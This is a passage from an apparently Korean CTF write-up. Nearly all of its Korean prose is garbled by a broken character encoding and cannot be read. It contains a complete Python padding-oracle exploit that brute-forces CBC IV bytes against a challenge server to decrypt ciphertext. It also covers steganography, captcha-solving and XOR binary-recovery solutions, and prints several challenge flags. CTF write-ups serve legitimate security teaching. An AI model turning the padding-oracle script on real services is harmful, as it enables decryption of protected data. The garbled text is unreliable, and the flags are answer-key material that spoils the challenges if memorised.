íŒ¨ë”©ì˜ ê²½ìš°, 5byteê°€ ë‚¨ì•˜ìœ¼ë©´ 0x05ë¡œ 5byteë¥¼ ì±„ìš°ê³  2byteê°€ ë‚¨ì•˜ìœ¼ë©´ 0x02ë¡œ 2byteë¥¼ ì±„ìš´ë‹¤. </li></ul><ul id="1b73d82d-0929-4bf8-b4b9-22c9d623860b" class="bulleted-list"><li>ë§Œì•½ í‰ë¬¸ì´ 8byteì¼ ê²½ìš° ë‹¤ìŒ ë¸”ë¡ì„ ëª¨ë‘ 0x08ë¡œ 8byte ì±„ìš´ë‹¤.</li></ul></li></ul><p id="25cebc16-3c57-43d4-b35b-6044a6e91515" class="">
</p><figure id="ee3b0eb2-7031-4094-94aa-16c3a4132deb" class="image"><a href="/assets/2020-09-01/bob/bob987.png"><img style="width:1155px" src="/assets/2020-09-01/bob/bob987.png"/></a></figure><ul id="e948d935-0652-45aa-af5d-a16c573cb355" class="bulleted-list"><li>ì•”í˜¸í™”ë¥¼ ìˆ˜í–‰í•˜ëŠ” ê³¼ì •ì€ ìœ„ ê·¸ë¦¼ê³¼ ê°™ë‹¤.</li></ul><ul id="11afe662-ad40-4a2d-be0c-0cfd9232820a" class="bulleted-list"><li>ivì™€ plain textë¥¼ xor í•˜ì—¬ Intermediary Valueë¥¼ ì–»ê³  ê·¸ ê°’ì„ 3DES ì•”í˜¸í™” ë°©ì‹ì„ ê±°ì³ ì•”í˜¸ë¬¸ìœ¼ë¡œ ë‚˜ì˜¨ë‹¤.</li></ul><ul id="13dad8fd-cd9f-45da-8a34-1dc336111f14" class="bulleted-list"><li>ì´í›„ ê·¸ ì•”í˜¸ë¬¸ì„ ivë¡œ ì‚¬ìš©í•œë‹¤. </li></ul><ul id="d946a037-22db-4863-992c-33c6bb6141a4" class="bulleted-list"><li>ì¦‰ ì•”í˜¸ë¬¸ì€, IV+ì•”í˜¸ë¸”ëŸ­1+ì•”í˜¸ë¸”ëŸ­2ë¡œ ì´ë¤„ì§„ë‹¤.</li></ul><figure id="83583dfa-a5a0-4b0e-8f85-eae67a36126a" class="image"><a href="/assets/2020-09-01/bob/bob988.png"><img style="width:995px" src="/assets/2020-09-01/bob/bob988.png"/></a></figure><ul id="ded9bc88-25e8-4137-8d16-34898f9ad9f9" class="bulleted-list"><li>ë³µí˜¸í™” ê³¼ì •ì„ ì‚´í´ë³´ë©´ ìœ„ ê·¸ë¦¼ê³¼ ê°™ë‹¤. ì•”í˜¸ë¬¸ì„ 3DESë¡œ ë³µí˜¸í™” í•˜ì—¬ Intermediary Value ê°’ì„ ì–»ëŠ”ë‹¤.</li></ul><ul id="850128cf-e060-4e80-979e-f141a45983ce" class="bulleted-list"><li>ì´í›„ IVì™€ Intermediary Valueë¥¼ XOR í•˜ì—¬ plain ê°’ì„ ì–»ëŠ”ë‹¤. </li></ul><figure id="cf07b386-aec3-4e39-adee-078bfc46f0a1" class="image"><a href="/assets/2020-09-01/bob/bob989.png"><img style="width:899px" src="/assets/2020-09-01/bob/bob989.png"/></a></figure><ul id="18f2cb11-879a-48e7-913e-02d8f7d47d64" class="bulleted-list"><li>IVì™€ Intermediary Value ê°’ì„ XOR í•œ plain ë¸”ëŸ­ì˜ ë§ˆì§€ë§‰ ê°’(íŒ¨ë”© ë¶€ë¶„)ì´ 0x01ì´ ë˜ëŠ” IV ë§ˆì§€ë§‰ ê°’ ì°¾ê³ , 0x01ê³¼ ê·¸ IV ë§ˆì§€ë§‰ ê°’ì„ XOR í•˜ë©´ Intermediaryì˜ ë§ˆì§€ë§‰ ê°’ì„ ì•Œ ìˆ˜ ìˆë‹¤. </li></ul><ul id="fc357646-dedc-432b-ae68-1a47caa549f5" class="bulleted-list"><li>ë™ì¼í•œ ë°©ì‹ìœ¼ë¡œ 0x01 ë¶€í„° 0x08ê¹Œì§€ íŒ¨ë”©ì„ ê°€ì •í•˜ì—¬ IV ê°’ì„ ë³€ê²½í•˜ë©° ì„œë²„ë¡œ ìš”ì²­ì„ ìˆ˜í–‰í•˜ê³ , invalid ì‘ë‹µì„ ê²½ìš°ì˜ ê°’ì„ ivë¡œ ë‘ê³  ê·¸ë•Œì˜ íŒ¨ë”© ê°’ê³¼ xor í•˜ì—¬ intermediary value ê°’ì„ ì–»ì„ ìˆ˜ ìˆê³  intermediary value ê°’ê³¼ ì´ë¯¸ ì•Œê³ ìˆëŠ” iv ê°’ì„ xor í•˜ì—¬ plain ê°’ì„ ì–»ì„ ìˆ˜ ìˆë‹¤.</li></ul><p id="535b881f-745d-4614-9b11-2a53a66fea3f" class="">
</p><p id="2a7f6568-897f-496a-9289-b5ec978e0d24" class=""><strong><mark class="highlight-red_background">FlAG íšë“!</mark></strong></p><p id="a5d3e5ca-aaee-43f9-b1e4-ad964a95a8d1" class="">Exploit code</p><pre id="0bb3e509-45fc-4816-b993-bc9d57a7bb57" class="code"><code>import base64
from urllib.parse import quote, unquote
import binascii
from urllib3.util.retry import Retry
from requests.adapters import HTTPAdapter
from collections import OrderedDict
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# paload send
def send_payload(s, payload_iv, payload_ciphertext):
    # variable initialization
	url = &quot;&quot;
	headers = {}
	params = {}
	data = {}

    # URL setting
	url = &#x27;http://1-star.kr/onestar/padding/module.php&#x27;

    # params setting
	params = {&#x27;iv&#x27;: base64.b64encode(payload_iv), &#x27;ciphertext&#x27;: base64.b64encode(payload_ciphertext)}

    # data setting
	data = OrderedDict()

    # send packet
	r = s.get(url, params=params, verify=False)
	return r.text

def xor(data, key):
	output = bytearray()
	for i, ch in enumerate(data):
		output.append(ch ^ key[i % len(key)])
	return bytes(output)

# hex
def hex_view(data):
	temp = data.hex()
	ret = &quot;&quot;
	for i in range(0, len(temp), 2):
		ret += temp[i:i+2] + &quot; &quot;
	return ret

iv=base64.b64decode(unquote(&quot;QjA2bGwxVTM%3D&quot;))
enc=base64.b64decode(unquote(&quot;EJA3gltQjV4%3D&quot;))
inter=b&#x27;&#x27;
s = requests.Session()

print(&quot;I V =&gt; {}&quot;.format(hex_view(iv)))
print(&quot;ENC =&gt; {}&quot;.format(hex_view(enc)))

#make iv 1~len(iv)+1 
for i in range(1,len(iv)+1):
	print (&quot;===========================================&quot;)
	print (&quot;i: &quot;,i)
	start = iv[:len(iv)-i]
	print (&quot;start: &quot;, hex_view(start))
	print (&quot;bytes([i]): &quot;, bytes([i]))
	for j in range(0,0xff+1):
		print (&quot;j: &quot;,j)
		target = start + bytes([j]) + xor(inter[::-1], bytes([i]))
		res = send_payload(s, target, enc)
		print(&quot;target: &quot;, hex_view(target), &quot;=&gt;&quot;, target)
		#print(hex_view(enc), &quot;=&gt;&quot;, enc)
		#print(res)
		if &#x27;Invalid padding.&#x27; not in res:
			print(res)
			break
	inter += bytes([i ^ j])
	print(&quot;inter: &quot;, hex_view(inter[::-1]))
	print(&quot;inter: &quot;, hex_view(inter[::-1]))

# inter xor iv =&gt; plain
inter = inter[::-1]
plain = xor(inter, iv)
print(&quot;plain =&gt;&quot;, plain)</code></pre><figure id="b2a17075-fd82-4d39-a304-000371d0ab20" class="image"><a href="/assets/2020-09-01/bob/bob990.png"><img style="width:981px" src="/assets/2020-09-01/bob/bob990.png"/></a></figure><figure id="496d3534-67fb-425e-8afd-ef8dd0b3f164" class="image"><a href="/assets/2020-09-01/bob/bob991.png"><img style="width:952px" src="/assets/2020-09-01/bob/bob991.png"/></a></figure><h1 id="5eb646bd-e9cf-4e9f-b8b7-41585ddbb233" class="">ğŸ–¥ï¸ MISC</h1><h2 id="1076afd7-b43e-403e-b644-abf839bee2ab" class="">&#x27;gif&#x27;t</h2><hr id="cccac227-7d55-4036-8efc-c761ea3d0e98"/><p id="c58ba904-1b16-4f9d-a03b-20f8736268f9" class="">ë¬¸ì œì— ëŒ€í•œ ê°„ë‹¨ ì„¤ëª…</p><figure id="f194f3a3-ce61-4028-bdb2-23d713059c81" class="image"><a href="/assets/2020-09-01/bob/bob992.png"><img style="width:791px" src="/assets/2020-09-01/bob/bob992.png"/></a></figure><figure class="block-color-gray_background callout" style="white-space:pre-wrap;display:flex" id="633fa1e2-ab01-4d9f-a602-46d42418dc56"><div style="font-size:1.5em"><span class="icon">ğŸ’¡</span></div><div style="width:100%">easy gif misc</div></figure><ul id="db22f766-18bf-44b2-aff7-58cf28b0e978" class="bulleted-list"><li>ë¬¸ì œì˜ ê·¸ë¦¼ì—ì„œ gif ê·¸ë¦¼ì„ ë³´ë©´ ë°˜ì§ì´ëŠ” ê¸€ìê°€ ë‘ ìœ„ì¹˜ì—ì„œ ë°˜ì§ì´ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆë‹¤. ì´ ê·¸ë¦¼ì´ ë¬¸ì œ íŒŒì¼ì´ë‹¤.</li></ul><figure id="8a9b1183-a0c6-4fff-b62f-c72af6364842" class="image"><a href="/assets/2020-09-01/bob/bob993.png"><img style="width:963px" src="/assets/2020-09-01/bob/bob993.png"/></a></figure><ul id="c10871b4-f810-467c-a7c6-b239eb5ca8c7" class="bulleted-list"><li>ì´ gif íŒŒì¼ì„ ë³´ë©´ 16ì§„ìˆ˜ë¡œ ë‘ ê°œì˜ ê¸€ìê°€ ì™”ë‹¤ê°”ë‹¤ í•˜ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆë‹¤.</li></ul><ul id="809d0c82-1514-4c58-b330-b24b29802716" class="bulleted-list"><li>í’€ì´í•˜ëŠ” ë°©ë²•ì€ ë‹¤ì–‘í•˜ê²Œ ìˆì„ ìˆ˜ ìˆê¸° ë•Œë¬¸ì— í•˜ë‚˜í•˜ë‚˜ ì„¤ëª…í•˜ì§€ ì•Šê³ , íŒŒì¼ ë‚´ë¶€ì˜ gif êµ¬ì„±ì„ ë³´ì—¬ì£¼ë„ë¡ í•˜ê² ë‹¤.</li></ul><figure id="71588847-f904-48c3-a9b0-2cef2fd33190" class="image"><a href="/assets/2020-09-01/bob/bob994.png"><img style="width:670px" src="/assets/2020-09-01/bob/bob994.png"/></a></figure><ul id="7157d1d8-49aa-40ff-ab55-1ca417de133f" class="bulleted-list"><li>ìœ„ì™€ ê°™ì´ ì´ë¯¸ì§€ë¥¼ ë³¼ ìˆ˜ ìˆëŠ”ë°, ì´ë¥¼ ì­ˆìš± ë”°ë¼ ì‘ì„±í•˜ì—¬ 16ì§„ìˆ˜ë¥¼ asciië¡œ ë³€í™˜í•˜ê²Œ ë˜ë©´ flagë¥¼ ì–»ì„ ìˆ˜ ìˆëŠ” ê°„ë‹¨í•œ ë¬¸ì œë‹¤.</li></ul><p id="a097b079-1134-46fc-901a-a59b50301da2" class="">
</p><h2 id="c6916655-7d89-4730-b76b-b240cf9895b2" class="">Hide And Seek</h2><hr id="339c151e-52c6-4374-81d9-88e5ffef69c1"/><figure id="0a5205b6-b20d-46bc-a118-907a98e3fed8" class="image"><a href="/assets/2020-09-01/bob/bob995.png"><img style="width:336px" src="/assets/2020-09-01/bob/bob995.png"/></a></figure><figure class="block-color-gray_background callout" style="white-space:pre-wrap;display:flex" id="7404e1a3-5544-43e2-9972-e3039b699200"><div style="font-size:1.5em"><span class="icon">ğŸ’¡</span></div><div style="width:100%">ì´ ë¬¸ì œì—ì„œëŠ” stego.png íŒŒì¼ì´ ì£¼ì–´ì§„ë‹¤. ì£¼ì–´ì§„ íŒŒì¼ì˜ ì´ë¦„ì— ë‚˜íƒ€ë‚˜ë“¯ Stegography ë¬¸ì œì˜ ì¼ì¢…ìœ¼ë¡œ íŒŒì•…í•  ìˆ˜ ìˆë‹¤.
ë¬¸ì œì˜ ì´ë¯¸ì§€ë¥¼ ì˜ ë³´ë©´ ì•„ë˜ ê²€ì€ìƒ‰ ì˜ì—­ì— ì´ˆë¡ìƒ‰ ì ë“¤ì´ ì¼ë¶€ ë‚˜íƒ€ë‚˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤. ì´ ë¬¸ì œëŠ” ì´ë¯¸ì§€ì˜ PIXELì„ êµ¬ì„±í•˜ëŠ” êµ¬ë¶„ ê°’ R,G,B,A ì¤‘ A ê°’(íˆ¬ëª…ë„)ì„ í™œìš©í•˜ì—¬ Flagë¥¼ ì¶”ì¶œí•˜ëŠ” ë¬¸ì œë‹¤. </div></figure><ul id="64237d9a-184f-40d6-a4df-73fc503af2ec" class="bulleted-list"><li>ì£¼ì–´ì§„ ì´ë¯¸ì§€ì—ì„œ Aê°’(íˆ¬ëª…ë„)ê°€ 0xFFê°€ ì•„ë‹Œ ì¢Œí‘œë“¤ê³¼ ê·¸ ì¢Œí‘œì— í•´ë‹¹í•˜ëŠ” Pixelì˜ R,G,B,A ê°’ë“¤ì„ ì¶”ì¶œí•˜ë©´ ì•„ë˜ì™€ ê°™ë‹¤.</li></ul><pre id="7b252db9-c852-40c8-8e54-cbc497104d3f" class="code"><code>(x,y) =&gt; (r,g,b,a)
===============================
(1,416)	=&gt; (13,110,20,170)	=&gt; &#x27;n&#x27;
(32,1172)	=&gt; (0,103,0,167)	=&gt; &#x27;g&#x27;
(45,967)	=&gt; (15,105,24,163)	=&gt; &#x27;i&#x27;
(113,1004)	=&gt; (17,71,28,172)	=&gt; &#x27;G&#x27;
(160,1010)	=&gt; (17,66,26,174)	=&gt; &#x27;B&#x27;
(161,704)	=&gt; (16,116,25,176)	=&gt; &#x27;t&#x27;
(192,110)	=&gt; (17,70,35,154)	=&gt; &#x27;F&#x27;
(289,983)	=&gt; (17,98,28,152)	=&gt; &#x27;b&#x27;
(301,736)	=&gt; (17,95,26,173)	=&gt; &#x27;_&#x27;
(312,1265)	=&gt; (0,103,0,157)	=&gt; &#x27;g&#x27;
(359,887)	=&gt; (17,64,27,156)	=&gt; &#x27;@&#x27;
(395,600)	=&gt; (202,95,163,161)	=&gt; &#x27;_&#x27;
(415,45)	=&gt; (18,105,36,175)	=&gt; &#x27;i&#x27;
(445,1106)	=&gt; (17,98,33,150)	=&gt; &#x27;b&#x27;
(453,256)	=&gt; (202,105,163,169)	=&gt; &#x27;i&#x27;
(456,783)	=&gt; (18,105,30,159)	=&gt; &#x27;i&#x27;
(480,433)	=&gt; (31,95,57,171)	=&gt; &#x27;_&#x27;
(533,833)	=&gt; (20,110,34,166)	=&gt; &#x27;n&#x27;
(557,90)	=&gt; (25,95,44,168)	=&gt; &#x27;_&#x27;
(643,1106)	=&gt; (17,111,33,151)	=&gt; &#x27;o&#x27;
(668,818)	=&gt; (17,123,27,153)	=&gt; &#x27;{&#x27;
(674,677)	=&gt; (30,105,34,165)	=&gt; &#x27;i&#x27;
(686,55)	=&gt; (18,100,36,164)	=&gt; &#x27;d&#x27;
(801,54)	=&gt; (17,108,35,155)	=&gt; &#x27;l&#x27;
(917,292)	=&gt; (18,36,35,177)	=&gt; &#x27;$&#x27;
(968,574)	=&gt; (15,72,25,162)	=&gt; &#x27;H&#x27;
(970,1039)	=&gt; (0,125,0,178)	=&gt; &#x27;}&#x27;
(972,801)	=&gt; (17,95,29,158)	=&gt; &#x27;_&#x27;
(987,922)	=&gt; (17,115,26,160)	=&gt; &#x27;s&#x27;</code></pre><ul id="58b4f7f3-6307-45e1-a500-bdcae00546a6" class="bulleted-list"><li>ìœ„ ê°’ë“¤ì—ì„œ ì¤‘ìš”í•œ ê°’ë“¤ì€ Gì— í•´ë‹¹í•˜ëŠ” ê°’ë“¤ê³¼ Aì— í•´ë‹¹í•˜ëŠ” ê°’ë“¤ì´ë‹¤.</li></ul><ul id="fca88a9a-5ee5-46ca-8b7f-455d01932f8c" class="bulleted-list"><li>GëŠ” Flagì˜ ê° ë¬¸ìë“¤ì„ ì˜ë¯¸í•˜ë©°, AëŠ” ë¬¸ìë“¤ì˜ Indexë¥¼ ì˜ë¯¸í•œë‹¤. </li></ul><ul id="f94dc22d-4a99-4c9a-a32c-f6be7d2c832a" class="bulleted-list"><li>G ê°’ë“¤ì„ Aì˜ ê°’ì— ë”°ë¼ ë‚˜ì—´í•˜ë©´ Flagë¥¼ ì¶”ì¶œí•  ìˆ˜ ìˆë‹¤.</li></ul><ul id="41aa10a9-7754-4ca6-8122-9a21db079057" class="bulleted-list"><li><strong>Flag : bob{Fl@g_is_Hiding_in_G_Bit$}</strong></li></ul><h2 id="c4afb7fe-867b-4024-9abb-5f44be507c1d" class="">Catcha</h2><hr id="b7a4a66f-b5e2-4aef-a11e-8c9e7b1ed540"/><figure id="6282942e-dd30-4f10-9f0b-7394b3054c51" class="image"><a href="/assets/2020-09-01/bob/bob996.png"><img style="width:713px" src="/assets/2020-09-01/bob/bob996.png"/></a></figure><figure class="block-color-gray_background callout" style="white-space:pre-wrap;display:flex" id="e3849c43-27da-4abf-af36-1815826af47c"><div style="font-size:1.5em"><span class="icon">ğŸ’¡</span></div><div style="width:100%">ì•½ 5ë§Œì¥ì˜ ê°•ì•„ì§€ì™€ ê³ ì–‘ì´ ì‚¬ì§„ì´ ëœë¤ìœ¼ë¡œ ë‚˜ì˜¤ë©°, 1ì´ˆ ì•ˆì— ì‚¬ì§„ì— ë‚˜ì˜¨ ë™ë¬¼ì´ ê°•ì•„ì§€ì¸ì§€ ê³ ì–‘ì´ì¸ì§€ ë§ì¶°ì•¼ í•˜ëŠ” captcha solver ë¬¸ì œì…ë‹ˆë‹¤. 300ê°œì˜ ìŠ¤í…Œì´ì§€ë¥¼ ëª¨ë‘ í´ë¦¬ì–´í•˜ë©´ í”Œë˜ê·¸ë¥¼ íšë“í•  ìˆ˜ ìˆë‹¤.</div></figure><p id="76cca7a8-4d79-4f9f-abba-7cb5b2146130" class="">
</p><p id="622a4e31-c88d-403d-aa67-827e0bd76251" class="">ì¶œì œ ì˜ë„ëŠ” ì¼ì¢…ì˜ &#x27;<code>ìë™ ì˜ì‚¬ ê²°ì •ê¸°</code>&#x27;ë¥¼ ë§Œë“¤ ìˆ˜ ìˆëŠ”ê°€?&#x27; ì´ë‹¤.</p><p id="c0d40164-8783-4c86-97a9-148c996e641b" class="">
</p><p id="5d5a22e7-53bd-41db-81c1-0153d5e48c55" class="">ì˜ë„í–ˆë˜ í’€ì´ëŠ” ì‚¬ì‹¤ <code>CNNê³¼ GANì„ ì ì ˆíˆ ì„ì–´ í•˜ë‚˜ì˜ ì•™ìƒë¸” ëª¨ë¸ì„ ì»´íŒŒì¼í•˜ê³  ì£¼ì–´ì§„ ë°ì´í„°ì…‹ìœ¼ë¡œ í•™ìŠµ í›„ ì •ë‹µì„ ì˜ˆì¸¡</code>í•˜ëŠ” ê²ƒì´ì˜€ìœ¼ë‚˜,  ë¬¸ì œì˜ ë‚œì´ë„ë¥¼ í•˜í–¥ ì¡°ì ˆ í•˜ë‹¤ ë³´ë‹ˆ(...) ë¬¸ì œì— ì œê³µë˜ëŠ” ë°ì´í„°ì…‹ì„ ì „ë¶€ ì œê³µí•˜ê²Œ ë˜ì—ˆê³ , ê·¸ë¡œ ì¸í•´ ë”°ë¡œ ëª¨ë¸ì„ ì»´íŒŒì¼í•˜ì§€ ì•Šê³  ì£¼ì–´ì§„ ë°ì´í„°ì…‹ìœ¼ë¡œ ì¼ì¢…ì˜ hash tableì„ ë§Œë“¤ì–´ ë¬¸ì œë¥¼ í’€ì´í•  ìˆ˜ ìˆë‹¤.</p><p id="00fa7675-be8f-4a98-b51c-3b4a8121d57d" class="">
</p><h3 id="daf77e06-1d50-4b5e-8c5a-cef4ed965706" class="">ë¨¸ì‹ ëŸ¬ë‹ìœ¼ë¡œ í’€ê¸°</h3><p id="05dd920f-9145-462b-9ca1-142f26f4f87e" class="">ë¶„ë¥˜í•´ì•¼ í•  ë°ì´í„°ê°€ ì´ë¯¸ì§€ì´ê¸° ë•Œë¬¸ì— <code>CNN(Convolutional Neural Network) ëª¨ë¸</code>ì„ ì‚¬ìš©í•œë‹¤. ì£¼ì–´ì§„ ë°ì´í„°ì…‹ì˜ ì´ë¯¸ì§€ ì‚¬ì´ì¦ˆê°€ ëª¨ë‘ ì œê°ê°ì´ê¸° ë•Œë¬¸ì— ì–´ëŠì •ë„ì˜ preprocessingÂ ì´ í•„ìš”í•˜ë‹¤. ë˜í•œ í›ˆë ¨ì˜ ì—°ì‚°ëŸ‰ì„ ì¤„ì—¬ í›ˆë ¨ íš¨ìœ¨ì„ ë†’ì´ê¸° ìœ„í•´ ì´ë¯¸ì§€ë¥¼ grayscaleë¡œ ë³€í™˜í–ˆë‹¤.</p><ol id="639f4773-d625-49e9-b3c1-71e39480393f" class="numbered-list" start="1"><li>ì´ë¯¸ì§€ ì „ì²˜ë¦¬ (Preprocessing)<pre id="2ed1dc60-ca73-499a-a5a1-5ef1dec3f00d" class="code"><code>import numpy as np
import pandas as pd
import cv2
import tensorflow as tf
from tensorflow.keras.models import Sequential
from tensorflow.keras.layers import Dense, Flatten, Dropout, Activation, Conv2D, MaxPooling2D

path = &#x27;./dataset/train&#x27;

X = []
y = [] # target
convert = lambda category : int(category == &#x27;dog&#x27;)

def preprocess(path):
    for p in os.listdir(path):
        category = p.split(&quot;.&quot;)[0]
        category = convert(category)
        img_array = cv2.imread(os.path.join(path,p),cv2.IMREAD_GRAYSCALE)
        new_img_array = cv2.resize(img_array, dsize=(80, 80))
        X.append(new_img_array)
        y.append(category)

# preprocess the data
preprocess(path)
X = np.array(X).reshape(-1, 80,80,1)
y = np.array(y)

# normalize data
X = X/255.0</code></pre><p id="7e73d043-64b8-4da1-a3d2-1b484a4af2c1" class="">
</p></li></ol><ol id="2ea7f0b2-0046-4e28-80db-27b33ddcf2a1" class="numbered-list" start="2"><li>ëª¨ë¸ ë¹Œë“œ ë° ì»´íŒŒì¼<pre id="8834b848-0042-4655-a31e-85ef8952ffc9" class="code"><code>model = Sequential()

# add a densely-connected layer with 64 units to the model:
model.add(Conv2D(64,(3,3), activation = &#x27;relu&#x27;, input_shape = X.shape[1:]))
model.add(MaxPooling2D(pool_size = (2,2)))

# add another layer:
model.add(Conv2D(64,(3,3), activation = &#x27;relu&#x27;))
model.add(MaxPooling2D(pool_size = (2,2)))

model.add(Flatten())
model.add(Dense(64, activation=&#x27;relu&#x27;))

# add a softmax layer with 10 output units:
model.add(Dense(1, activation=&#x27;sigmoid&#x27;))

model.compile(optimizer=&quot;adam&quot;,
              loss=&#x27;binary_crossentropy&#x27;,
              metrics=[&#x27;accuracy&#x27;])</code></pre><p id="b4587687-3ba9-474e-83f8-ae700c7051c3" class="">
</p></li></ol><ol id="21f0aa88-fbcf-4a6f-b8f4-7100eb7c8426" class="numbered-list" start="3"><li>ëª¨ë¸ í•™ìŠµ<pre id="46b4a711-dadf-4cc8-b405-2680d74a1052" class="code"><code>model.fit(X, y, epochs=10, batch_size=32, validation_split=0.2)</code></pre><p id="cdf0e7e4-fb08-466e-9137-030d094c9b08" class="">
</p></li></ol><ol id="091db5c7-972d-4954-9fe2-d8c1428b406f" class="numbered-list" start="4"><li>ì´ë¯¸ì§€ ì˜ˆì¸¡<pre id="586605de-414d-4f46-a9df-47dd05728d01" class="code"><code>cv2.imread(path, cv2.IMREAD_GRAYSCALE)
# resize
cv2.resize(img_array, dsize=(80,80))
# reshape
data = np.array(data).reshape(-1,80,80,1)
# normalize
data = data/255.0

# predict
model.predict(data)</code></pre><p id="5d5544c3-51b2-4ec5-8f93-043f81b21d42" class="">ì´í›„, í•™ìŠµí•œ ëª¨ë¸ì„ ì´ìš©í•´ ë¬¸ì œ ì´ë¯¸ì§€ë¥¼ ì‹¤ì‹œê°„ìœ¼ë¡œ ë°›ì•„ì˜¤ê³  ë¬¸ì œì˜ ì •ë‹µì„ ì˜ˆì¸¡í•œ ë’¤ ì •ë‹µì„ ì„œë²„ë¡œ ì „ì†¡í•˜ë©´ ëœë‹¤.</p><p id="70593af3-466e-4355-a234-fa675abc0133" class="">
</p></li></ol><h3 id="f018c9e6-ac98-4716-a40b-c943cf30c7bd" class="">hashtableë¡œ í’€ê¸°</h3><p id="e205869b-50f8-458a-ad62-3c0e559f9848" class="">ì†ŒìŠ¤ì½”ë“œì— ë‚˜ì™€ìˆëŠ” kaggle competitionì— ì ‘ì†í•˜ì—¬ ì£¼ì–´ì§„ ë°ì´í„°ì…‹ì„ ëª¨ë‘ ë‹¤ìš´ë¡œë“œ ë°›ì€ ë‹¤ìŒ hash table ì„ ì œì‘í•œë‹¤. ì´í›„ ë¬¸ì œ ì´ë¯¸ì§€ì— í•´ë‹¹í•˜ëŠ” hashë¥¼ ì´ìš©í•˜ì—¬ ë¬¸ì œì˜ ì •ë‹µì„ êµ¬í•œë‹¤.</p><p id="a9fb28b6-1ae7-4acc-ac43-c54c86319ccd" class="">
</p><h2 id="1fe1f3a4-e0b5-4320-9ecb-7d51c06993af" class="">verrox</h2><hr id="d17def0e-bdf7-4381-bacc-e09c7bfd9b53"/><figure id="8e8cd0a7-a3a9-4cbc-b8f4-507a2a867fd3" class="image"><a href="/assets/2020-09-01/bob/bob997.png"><img style="width:791px" src="/assets/2020-09-01/bob/bob997.png"/></a></figure><figure class="block-color-gray_background callout" style="white-space:pre-wrap;display:flex" id="dc998500-7be1-4a01-a3ad-30a3a97302db"><div style="font-size:1.5em"><span class="icon">ğŸ’¡</span></div><div style="width:100%">descriptionì„ ì‚´í´ë³´ë©´ ì„¸ìƒì´ ë’¤ì§‘ì–´ì§„ ê²ƒ ê°™ë‹¤ëŠ” ë§ì„ í•˜ê³  ìˆë‹¤.
verroxë¥¼ ë’¤ì§‘ìœ¼ë©´ xorrevì´ë©°, xor + revë¼ëŠ” ê²ƒì„ ìœ ì¶”í•  ìˆ˜ ìˆë‹¤.
í•´ë‹¹ ë°”ì´ë„ˆë¦¬ë¥¼ reverseí•œ í›„ 8ë°”ì´íŠ¸ xor í‚¤ë¥¼ êµ¬í•´ ì—°ì‚°í•˜ë©´ ì›ë³¸ ELF íŒŒì¼ì´ ë‚˜ì˜¤ê²Œ ë˜ë©°, ì‹¤í–‰ ì‹œ í”Œë˜ê·¸ë¥¼ ì–»ì„ ìˆ˜ ìˆë‹¤.</div></figure><p id="8bb3dd52-9db4-44c4-9b94-fabd6253c635" class="">
</p><h3 id="5fbd0d2c-6460-4c55-9b90-1489b3d0a8da" class="">1. xor key</h3><figure id="8025021a-c47e-4554-9f31-dfc39e3ebfd5" class="image"><a href="/assets/2020-09-01/bob/bob998.png"><img style="width:603px" src="/assets/2020-09-01/bob/bob998.png"/></a></figure><ul id="9a448c2e-db5a-453e-ba16-d3f477f9ef7c" class="bulleted-list"><li>ë°”ì´ë„ˆë¦¬ë¥¼ hexdump, hxd ë“±ìœ¼ë¡œ ì‚´í´ë³´ë©´ 0x231f33f2aa2d7ed2ê°€ ìƒë‹¹íˆ ë§ì´ ìˆëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.</li></ul><ul id="763be2a4-2f53-478d-bf28-cb4d21f8505a" class="bulleted-list"><li>8ë°”ì´íŠ¸ ë‹¨ìœ„ë¡œ 0x231f...ê°€ ë°˜ë³µë˜ê³  ìˆê¸° ë•Œë¬¸ì— 8ë°”ì´íŠ¸ ë‹¨ìœ„ë¡œ xor ì—°ì‚°ì„ í–ˆë‹¤ê³  ë³¼ ìˆ˜ ìˆë‹¤. ë˜í•œ, elf ë°”ì´ë„ˆë¦¬ì˜ ê²½ìš° null byteì˜ ë°˜ë³µì´ ë§ê¸° ë•Œë¬¸ì— xor keyëŠ” 0x231f33f2aa2d7ed2ë¡œ ê°€ì •í•  ìˆ˜ ìˆë‹¤.</li></ul><p id="c8b6f7bf-5dca-4b8f-be43-943ac8f62979" class="">
</p><h3 id="81e3ea12-9393-4fd0-8bc7-d55f08fe74d7" class="">2. í’€ì´</h3><pre id="6a66799c-a54f-4ac5-a9d6-da0f9e02a62e" class="code"><code>#coding: utf-8

import struct


data = b&#x27;&#x27;
with open(&quot;verrox&quot;, &quot;rb&quot;) as f:
    data = f.read()

with open(&quot;xorrev&quot;, &quot;wb&quot;) as f:
    key = b&quot;\x23\x1f\x33\xf2\xaa\x2d\x7e\xd2&quot;
    res = b&quot;&quot;
    for i in range(0, len(data)):
        res += struct.pack(&quot;B&quot;, data[i]^key[i%8])

    res = res[::-1]
    f.write(res)</code></pre><figure id="63918d1b-1f80-44c4-9d0c-466fd6d28865" class="image"><a href="/assets/2020-09-01/bob/bob999.png"><img style="width:976px" src="/assets/2020-09-01/bob/bob999.png"/></a></figure><ul id="a44f2d01-018c-49e1-be95-441e98c26f39" class="bulleted-list"><li>í•´ë‹¹ xor keyë¥¼ ì´ìš©í•˜ì—¬ 8ë°”ì´íŠ¸ ë‹¨ìœ„ë¡œ xorì—°ì‚° í›„ reverse í•´ì£¼ê²Œ ë˜ë©´ ì›ë³¸ ë°”ì´ë„ˆë¦¬ë¥¼ íšë“í•  ìˆ˜ ìˆë‹¤.</li></ul><p id="5bba1572-d03a-48d3-b9a3-ef0be5c96b7c" class="">
</p><figure id="e59f2ccc-bc2a-4d20-9beb-6dc130f3ceb8" class="image"><a href="/assets/2020-09-01/bob/bob9100.png"><img style="width:347px" src="/assets/2020-09-01/bob/bob9100.png"/></a></figure><ul id="67c19fe9-d9a9-4cb9-adba-1c16ff61dd38" class="bulleted-list"><li>ì–»ì–´ë‚¸ ë°”ì´ë„ˆë¦¬ë¥¼ ì‹¤í–‰í•˜ë©´ í”Œë˜ê·¸ë¥¼ ì–»ì„ ìˆ˜ ìˆë‹¤.</li></ul><ul id="922be427-0f66-4cdb-9f37-05b13f509893" class="bulleted-list"><li>FLAG : <mark class="highlight-yellow_background">bob{royal_macaron_is_very_tasty_you_know?}</mark></li></ul><p id="19212645-2896-4eb5-9f09-f72cd54cb3ff" class="">
</p><p id="ff941ff8-f7db-494f-8b4e-fd5980312dd3" class="">
